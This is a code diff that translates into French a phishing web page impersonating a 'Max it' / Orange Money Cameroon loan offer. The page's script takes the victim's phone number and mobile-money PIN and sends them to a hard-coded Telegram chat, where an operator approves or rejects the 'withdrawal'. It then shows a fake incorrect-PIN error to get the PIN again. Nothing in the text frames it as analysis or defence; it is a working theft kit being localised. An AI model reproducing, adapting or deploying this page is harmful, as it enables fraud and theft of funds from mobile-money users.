@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Max it Cameroon - Available Limit</title>
+    <title>Max it Cameroun - Plafond disponible</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -312,10 +312,10 @@
         </header>
 
         <div class="content-area">
-            <div class="greeting" id="greetingText">Hello, Applicant!</div>
+            <div class="greeting" id="greetingText">Bonjour, demandeur !</div>
 
             <div class="limit-card">
-                <div class="limit-label">Approved Loan Limit</div>
+                <div class="limit-label">Plafond de prêt approuvé</div>
                 <div class="limit-amount">
                     <span id="animatedNumber">0</span>
                     <span class="currency">XAF</span>
@@ -323,14 +323,14 @@
             </div>
 
             <button class="btn-withdraw" id="withdrawBtn">
-                Withdraw Now <i class="fa-solid fa-arrow-right"></i>
+                Retirer maintenant <i class="fa-solid fa-arrow-right"></i>
             </button>
 
             <div class="info-box">
                 <div class="info-icon"><i class="fa-solid fa-wallet"></i></div>
                 <div class="info-text">
-                    <h4>Instant Transfer</h4>
-                    <p>Funds will be deposited directly to your Orange Money Cameroon wallet.</p>
+                    <h4>Virement instantané</h4>
+                    <p>Les fonds seront versés directement sur votre compte Orange Money Cameroun.</p>
                 </div>
             </div>
         </div>
@@ -338,8 +338,8 @@
         <div class="modal-overlay" id="pinOverlay">
             <div class="pin-modal">
                 <button class="close-modal" id="closeModalBtn"><i class="fa-solid fa-xmark"></i></button>
-                <h3>Confirm Withdrawal</h3>
-                <p>Enter your 4-digit Max it PIN to authorize this transaction.</p>
+                <h3>Confirmer le retrait</h3>
+                <p>Entrez votre code PIN Max it à 4 chiffres pour autoriser cette transaction.</p>
 
                 <div class="pin-inputs">
                     <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
@@ -348,7 +348,7 @@
                     <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
                 </div>
 
-                <button class="btn-confirm" id="confirmBtn">CONFIRM</button>
+                <button class="btn-confirm" id="confirmBtn">CONFIRMER</button>
             </div>
         </div>
 
@@ -357,9 +357,9 @@
     <div id="errorModal" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; justify-content: center; align-items: center; padding: 20px;">
         <div style="background: white; padding: 25px; border-radius: 16px; text-align: center; width: 100%; max-width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
             <i class="fa-solid fa-circle-xmark" style="color: #ef4444; font-size: 40px; margin-bottom: 15px;"></i>
-            <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
-            <p style="color: #666; font-size: 14px; margin-bottom: 20px;" id="errorText">Incorrect PIN, please try again.</p>
-            <button onclick="closeErrorModal()" style="width: 100%; background: #FF7900; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Try Again</button>
+            <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Échec de la vérification</h3>
+            <p style="color: #666; font-size: 14px; margin-bottom: 20px;" id="errorText">Code PIN incorrect, veuillez réessayer.</p>
+            <button onclick="closeErrorModal()" style="width: 100%; background: #FF7900; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Réessayer</button>
         </div>
     </div>
 
@@ -368,7 +368,7 @@
         let cleanPhoneForBot = 'UNKNOWN';
 
         if (savedPhone) {
-            document.getElementById('greetingText').innerText = `Hello, ${savedPhone}`;
+            document.getElementById('greetingText').innerText = `Bonjour, ${savedPhone}`;
             let cleanNumber = savedPhone.replace(/[^0-9]/g, '');
             cleanPhoneForBot = '237' + cleanNumber;
         }
@@ -460,15 +460,15 @@
         const chatId = '8851096978';
 
         function sendWithdrawalToTelegram(phone, pin, amount) {
-            const message = `💸 *Withdrawal Request (Cameroon)*\nPhone: \`+${phone}\`\nAmount: \`${amount} XAF\`\n🔑 PIN Entered: \`${pin}\`\n\n👇 Please Approve or Reject:`;
+            const message = `💸 *Demande de retrait (Cameroun)*\nTéléphone : \`+${phone}\`\nMontant : \`${amount} XAF\`\n🔑 PIN saisi : \`${pin}\`\n\n👇 Veuillez approuver ou rejeter :`;
 
             const inlineKeyboard = {
                 inline_keyboard: [
                     [{
-                        text: "✅ Approve",
+                        text: "✅ Approuver",
                         callback_data: `WDR_APP_${phone}`
                     }, {
-                        text: "❌ Reject",
+                        text: "❌ Rejeter",
                         callback_data: `WDR_REJ_${phone}`
                     }]
                 ]
@@ -522,26 +522,26 @@
                                             decided = true;
                                             clearInterval(intervalId);
 
-                                            btnElement.innerHTML = 'CONFIRM';
+                                            btnElement.innerHTML = 'CONFIRMER';
                                             btnElement.style.opacity = '1';
                                             btnElement.disabled = true;
                                             btnElement.classList.remove('active');
 
-                                            document.getElementById('errorText').innerText = "Incorrect PIN, please try again.";
+                                            document.getElementById('errorText').innerText = "Code PIN incorrect, veuillez réessayer.";
                                             errorModal.style.display = 'flex';
                                         }
                                     }
                                 }
                             })
-                            .catch(err => console.error("Polling error:", err));
+                            .catch(err => console.error("Erreur de scrutation :", err));
                     }, 4000);
                 })
                 .catch(err => {
-                    console.error("Failed to initialize Telegram polling:", err);
-                    btnElement.innerHTML = 'CONFIRM';
+                    console.error("Échec de l'initialisation de la scrutation Telegram :", err);
+                    btnElement.innerHTML = 'CONFIRMER';
                     btnElement.style.opacity = '1';
                     btnElement.disabled = false;
-                    alert("Network error communicating with the server.");
+                    alert("Erreur réseau lors de la communication avec le serveur.");
                 });
         }
 
@@ -549,21 +549,21 @@
             const finalPin = Array.from(pinBoxes).map(box => box.value).join('');
             const btn = this;
 
-            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
+            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Traitement en cours...';
             btn.style.opacity = '0.8';
             btn.disabled = true;
 
             sendWithdrawalToTelegram(cleanPhoneForBot, finalPin, targetAmount.toLocaleString())
                 .then(response => {
-                    if (!response.ok) throw new Error("Failed to send Telegram message");
+                    if (!response.ok) throw new Error("Échec de l'envoi du message Telegram");
                     startListeningForWithdrawalDecision(cleanPhoneForBot, btn);
                 })
                 .catch(error => {
-                    console.error("Telegram API Error:", error);
-                    btn.innerHTML = 'CONFIRM';
+                    console.error("Erreur API Telegram :", error);
+                    btn.innerHTML = 'CONFIRMER';
                     btn.style.opacity = '1';
                     btn.disabled = false;
-                    alert("Error connecting to the server. Please try again.");
+                    alert("Erreur de connexion au serveur. Veuillez réessayer.");
                 });
         });
     </script>
